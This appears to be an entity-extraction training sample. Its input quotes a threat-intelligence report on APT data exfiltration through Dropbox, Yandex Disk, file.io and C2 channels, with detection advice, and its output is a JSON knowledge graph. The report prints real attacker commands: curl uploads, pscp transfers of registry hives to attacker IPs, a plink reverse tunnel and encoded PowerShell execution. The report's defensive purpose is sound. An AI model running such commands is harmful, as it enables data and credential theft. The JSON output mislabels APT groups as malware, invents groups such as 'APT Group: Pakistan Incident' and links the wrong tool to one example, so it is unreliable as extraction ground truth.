@@ -1,0 +1,395 @@
+
+
+
+Sentence : Exfiltration TA0010
+Exfiltration Over Web Service T1567
+Basic description
+Contents 277
+When implementing the Exfiltration Over Web Service technique, attackers use legitimate web services for
+data exfiltration. Connections to popular web services are less noticeable among the normal flow of network
+events because many users utilize these services. This enables attackers to bypass some security solutions.
+The typical web services used for exfiltration by attackers include popular cloud services, code repositories
+such as GitHub, file sharing services, and messengers such as Telegram.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Exfiltration TA0010  |  Exfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002
+Exfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002
+Basic description
+Contents 278
+Cloud storage services are the most convenient services for data exfiltration because a firewall normally
+allows outbound connections to these services and attackers don't need to configure additional rules. Actors
+use popular services like Google Drive or Dropbox so that their traffic is less noticeable.
+Examples of procedures
+Example 1
+When analyzing the tools used by the APT31 group in their campaigns targeting government agencies
+and military structures in Russia, we encountered the third-stage implant named cl.exe (MD5:
+F8553382DE7E1E349D8E91EDB7C57953) that uses Dropbox to send the files collected on a host.
+The cl.exe file is started by a second-stage implant (MD5: 03C74722A8E6E5E7EA0A5ED0C9F23696).
+Its arguments include the directory from which the archive should be exfiltrated and an API token for
+accessing Dropbox.
+POST request example:
+POST https://content.dropboxapi.com/2/files/upload HTTP/1.1
+Authorization: Bearer 
+Dropbox-API-Arg: {"path": "/DF001/0828475d0828475d","mode": "overwrite"}
+Content-Type: application/octet-stream
+Host: content.dropboxapi.com
+Content-Length: 524
+Connection: Keep-Alive
+Cache-Control: no-cache
+APT31 also has samples that use Yandex Disk:
+c:\Windows\security\audit\AuditSvc.exe
+MD5: 5C3A88073824A1BCE4359A7B69ED0A8D
+C:\intel\yandex.exe
+MD5: 27C9BB44F6521B770CD4576587A140D5
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Exfiltration TA0010  |  Exfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002
+Contents 279
+The passed arguments may include an authentication token, file path, and some other parameters. Startup
+parameters may also be specified in the MyLog.ini configuration file residing in the same directory.
+Figure 67
+Config file of the implant
+Example 2
+In one of the incidents described earlier, a "WebDav-O Yandex" malware variant was used (MD5:
+21F7A530CB718A32E08D4AE8207F7D4D). This implant allows saving files containing commands to be run on
+the host and sending the collected data to Yandex Disk. To access the storage, the implant code included the
+account credentials required for negotiating the encryption key. Files containing commands were encrypted
+with this key.
+Image_path: C:\Windows\system32\svchost.exe
+URL: “webdav.yandex.ru”
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Exfiltration TA0010  |  Exfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002
+WebDav-O Yandex supports the following run parameters:
+Command Description
+Contents 280
+Uses the PUT method to upload the file specified as the command argument to Yandex
+"-upload"
+Disk.
+Uses a GET request to download the file specified as the command argument, then uses
+"-download"
+the DELETE method to delete it from the storage repository.
+"-quit" Resets the internal sleep counter to 1 minute and exits command processing.
+"-setsleep" Sets the internal sleep counter to the number of minutes specified in the argument.
+"-sleepuntil" Sets the time of next connection specified in a command argument.
+default Any other command is handled as "cmd.exe /c".
+Example 3
+One of the new tools used by the ToddyCat group is called Dropbox Uploader, which sends collected data
+to Dropbox. It accepts an access token as an argument and searches the current directory for files with the
+following extensions:
+.z; .001; .002; .003; .004; .005; .006; .007; .008; .009; .010; .011; .012; .013; .014; .015
+Dropbox Uploader sends the found files to Dropbox and puts them into a folder that is named with the current
+date and time.
+POST /2/files/upload HTTP/1.1
+Connection: Keep-Alive
+Content-Type: application/octet-stream
+Accept: /
+Authorization: Bearer %Authorization Token%
+User-Agent: api-explorer-client
+Dropbox-API-Arg: {"path":"/%DateTime%/%File%.z","mode":{".tag":"overwrite"}}
+Content-Length: 5641797
+Host: content.dropboxapi.com
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Exfiltration TA0010  |  Exfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002
+Example 4
+Contents 281
+In one of the incidents presented earlier, the attackers used the popular file sharing service known as file.io:
+$system32\cmd.exe /C curl -F "file=@$selfpath\1.rar" --ssl-no-revoke https://file.io
+Attackers used the console-based curl utility to send the generated archive to file.io.
+Detection
+To detect data exfiltration through cloud services, you must track network connections to those services
+from processes that do not normally interact with cloud storage services. In a correlation rule, you can filter
+applications used to work with the cloud and popular web browsers. You can configure customized exclusions
+and filters for each specific company.
+Do not forget that malicious files can masquerade as legitimate processes by using various techniques,
+including the following: Process Injection T1055, Masquerading T1036, Hijack Execution Flow T1574. To detect
+these techniques, please refer to the sections describing them.
+Event source Log Event ID
+Sysmon Sysmon 3
+SIGMA rules
+
+
+Sigma-Generic-Network Connection to Cloud Storage
+
+
+Sigma-Generic-Network Connection to Cloud Storage in Command Line
+
+
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Exfiltration TA0010  |  Exfiltration Over C2 Channel T1041
+Exfiltration Over C2 Channel T1041
+Basic description
+Contents 282
+The Exfiltration over C2 Channel technique is used by attackers for data exfiltration from a target system
+through a C2 channel, which is the channel used for interaction between a system controlled by the attackers
+and a compromised system.
+This technique can be quite difficult to detect because it uses legitimate network channels and protocols to
+make the traffic look legitimate.
+Exfiltration can be implemented directly in malware written by attackers without using additional tools or
+commands. In this case, the malware can be installed as a service that constantly tracks data intended for
+exfiltration. Attackers can add their custom-written malicious scripts for data collection and exfiltration to the
+Task Scheduler to run them on a schedule.
+Attackers can also use a command shell and execute commands for exfiltration of specific data over an
+established C2 channel. Attackers often use post-exploitation tools that include exfiltration functions. Asian
+APT groups use a broad spectrum of post-exploitation methods and tools. The most popular tools used by
+attackers include the following:
+1
+Cobalt Strike
+2
+PlugX
+3
+Gh0st Rat
+4
+PowerShell Empire
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Exfiltration TA0010  |  Exfiltration Over C2 Channel T1041
+Examples of procedures
+Example 1
+Contents 283
+In the summer of 2022, we observed activity of the group known as Lucky Mouse. The group injected into the
+lsass.exe process a trojan that lets an operator remotely execute various commands on the target system.
+Some of the exfiltration commands that were executed by attackers on compromised hosts are shown below:
+echo y | pscp -pw "" 07.rar @103.139.146.14:/tmp/07.rar
+echo y | plink.exe -C -N -R 45693:10.10.11.15:22 @202.21.116.154 -P 443 -pw 
+plink.exe -pw "" @103.139.146.14 "ls -la /tmp/a1.zip”
+PSCP (PuTTY Secure Copy Protocol) is a console-based utility that transfers files between two systems via
+SCP.
+Plink is a console-based PuTTY client that an attacker can use to verify the successful transfer of files.
+Example 2
+We observed the use of the PSCP utility in the incident involving WebDav-O malware:
+rar.exe a 162.rar -r "\[REDACTED]\C:\Windows\Temp*.save" -p
+pscp.exe -P 8443 -pw [REDACTED] C:\Windows\System32\logfiles\162.rar root@5.183.103[.]181:/
+root/162.rar
+In this case, the attackers sent saved SAM, SYSTEM, and SECURITY hives to a remote server to extract
+account credentials.
+Example 3
+While analyzing the tools used in the incident in Pakistan, we encountered PowerShell scripts that were used
+for data collection on a host and subsequent data exfiltration. The contents of the scripts were Base64encoded and saved to a file in a temporary directory.
+The attackers added a task to the Task Scheduler to run a PowerShell command that executed this encoded
+script:
+$system32\WindowsPowerShell\v1.0\PowerShell.EXE -c "$ctnt=Get-Content $temp\
+Err_36d96944_6318.log;PowerShell -enc $ctnt;"
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Exfiltration TA0010  |  Exfiltration Over C2 Channel T1041
+The decrypted script looks as follows:
+Figure 68 The decrypted PowerShell script
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Contents 284
+Technical details  |  Exfiltration TA0010  |  Exfiltration Over C2 Channel T1041 Contents 285
+The Base64-encoded string in the script above represents the following code:
+Figure 69 The poweshell code decrypted from base-64 string
+To send their collected RAR archives in a REST API request to the remote server hxxps://www.apple-cart[.]
+com, the attackers used the PowerShell method Invoke-RestMethod. Before the data was sent, it was
+encoded in a special format.
+Detection
+Exfiltration often involves a large amount of data, therefore any unusual bursts of network traffic may be an
+indicator of data leaks. Network traffic analysis (NTA) systems can identify large or unusual data transfers, and
+they can employ machine learning algorithms to detect anomalies, including data exfiltration.
+In a SIEM system, you can detect this technique through a netflow analysis. For example, you can detect when
+the number of bytes sent over a specific period of time exceeds a certain threshold value. This type of rule can
+also be used in combination with other rules, because legitimate applications can also send a large amount of
+data.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Exfiltration TA0010  |  Exfiltration Over C2 Channel T1041
+Contents 286
+EPP is another type of solution that can detect data exfiltration. EPP solutions track activity on a host,
+including system events, network traffic, and API function calls. When analyzing the activity of a process
+to find network interaction, you can look for various APIs, such as Winsock (connect(), send(), recv()) or the
+higher-level WinInet (HTTPSendRequest). The Crypto API can also be used to encrypt data before it is sent to
+a C2 server.
+One of the detection methods is Cyber Threat Intelligence. A SOC can use threat intelligence (TI) sources to
+detect known C2 domains and IP addresses that are associated with known APT groups. A security team can
+track network traffic and activity on a host to detect connections to these C2 servers. Up-to-date information
+about malicious domains and IP addresses is provided in Kaspersky Threat Data Feeds.
+Learn more
+Exfiltration can also be detected based on specific PowerShell commands that enable attackers to send data
+to a remote server:
+Cmdlet Aliases
+Invoke-WebRequest iwr, curl, wget
+Invoke-RestMethod irm
+Please keep in mind that APT groups often obfuscate the commands they execute. For this reason, do not
+forget about the Obfuscated Files or Information T1027 technique.
+You must also track the startup of various post-exploitation tools and utilities that can be used for data
+exfiltration.
+Event source Log Event ID
+Windows Security 4688
+Sysmon Sysmon 1, 3
+Microsoft-Windows-PowerShell/
+Windows 4103, 4104
+Operational
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Exfiltration TA0010  |  Exfiltration Over C2 Channel T1041
+SIGMA rules
+
+
+Sigma-Generic-Protocol Tunneling via Plink Utility
+
+
+Sigma-Generic-Ingress Tool Transfer via curl.exe
+
+
+Sigma-Generic-Execution of Downloaded PowerShell Code
+
+
+Sigma-Generic-Exfiltration via pscp.exe
+
+
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Contents 287
+Technical details  |  Impact TA0040
+Output : 
+{
+  "nodes": [
+    {
+      "id": "1",
+      "type": "Tactic",
+      "label": "Exfiltration Over C2 Channel (T1041)",
+      "description": "Attackers use a Command and Control (C2) channel to exfiltrate data from a compromised system."
+    },
+    {
+      "id": "2",
+      "type": "Tactic",
+      "label": "Exfiltration Over Web Service (T1567)",
+      "description": "Attackers use web services to exfiltrate data from a compromised system."
+    },
+    {
+      "id": "3",
+      "type": "Tool",
+      "label": "Cobalt Strike",
+      "description": "A popular post-exploitation tool used by APT groups for various malicious activities, including data exfiltration."
+    },
+    {
+      "id": "4",
+      "type": "Tool",
+      "label": "PlugX",
+      "description": "A remote access trojan (RAT) commonly used in APT campaigns for data exfiltration."
+    },
+    {
+      "id": "5",
+      "type": "Tool",
+      "label": "Gh0st Rat",
+      "description": "A RAT that allows attackers to control a compromised system and exfiltrate data."
+    },
+    {
+      "id": "6",
+      "type": "Tool",
+      "label": "PowerShell Empire",
+      "description": "A post-exploitation framework that uses PowerShell for data exfiltration and other malicious activities."
+    },
+    {
+      "id": "7",
+      "type": "Malware",
+      "label": "WebDav-O",
+      "description": "Malware used in various APT campaigns, including data exfiltration using the PSCP utility."
+    },
+    {
+      "id": "8",
+      "type": "Tool",
+      "label": "PSCP",
+      "description": "A console-based utility for transferring files between systems securely via SCP."
+    },
+    {
+      "id": "9",
+      "type": "Tool",
+      "label": "Plink",
+      "description": "A command-line interface to the PuTTY back ends, used by attackers to verify file transfers."
+    },
+    {
+      "id": "10",
+      "type": "Tool",
+      "label": "curl",
+      "description": "A command-line tool for transferring data with URLs, often used in APT campaigns for data exfiltration."
+    },
+    {
+      "id": "11",
+      "type": "Tactic",
+      "label": "Exfiltration Over C2 Channel (Example 1)",
+      "description": "Lucky Mouse group used PSCP and Plink to exfiltrate files from compromised systems."
+    },
+    {
+      "id": "12",
+      "type": "Tactic",
+      "label": "Exfiltration Over C2 Channel (Example 2)",
+      "description": "WebDav-O malware used PSCP to transfer saved SAM, SYSTEM, and SECURITY hives to a remote server."
+    },
+    {
+      "id": "13",
+      "type": "Tactic",
+      "label": "Exfiltration Over C2 Channel (Example 3)",
+      "description": "PowerShell scripts were used for data collection and exfiltration in an incident in Pakistan."
+    },
+    {
+      "id": "14",
+      "type": "Malware",
+      "label": "APT Group: Lucky Mouse",
+      "description": "An APT group known for using PSCP and Plink to exfiltrate files from compromised systems."
+    },
+    {
+      "id": "15",
+      "type": "Malware",
+      "label": "APT Group: WebDav-O Malware",
+      "description": "An APT group that used WebDav-O malware for data exfiltration."
+    },
+    {
+      "id": "16",
+      "type": "Malware",
+      "label": "APT Group: Pakistan Incident",
+      "description": "An APT group that used PowerShell scripts for data collection and exfiltration in an incident in Pakistan."
+    }
+  ],
+  "edges": [
+    {
+      "source": "1",
+      "target": "3"
+    },
+    {
+      "source": "1",
+      "target": "4"
+    },
+    {
+      "source": "1",
+      "target": "5"
+    },
+    {
+      "source": "1",
+      "target": "6"
+    },
+    {
+      "source": "1",
+      "target": "8"
+    },
+    {
+      "source": "1",
+      "target": "9"
+    },
+    {
+      "source": "1",
+      "target": "10"
+    },
+    {
+      "source": "11",
+      "target": "14"
+    },
+    {
+      "source": "12",
+      "target": "15"
+    },
+    {
+      "source": "13",
+      "target": "16"
+    },
+    {
+      "source": "11",
+      "target": "8"
+    },
+    {
+      "source": "11",
+      "target": "9"
+    },
+    {
+      "source": "12",
+      "target": "8"
+    },
+    {
+      "source": "13",
+      "target": "10"
+    }
+  ]
+}
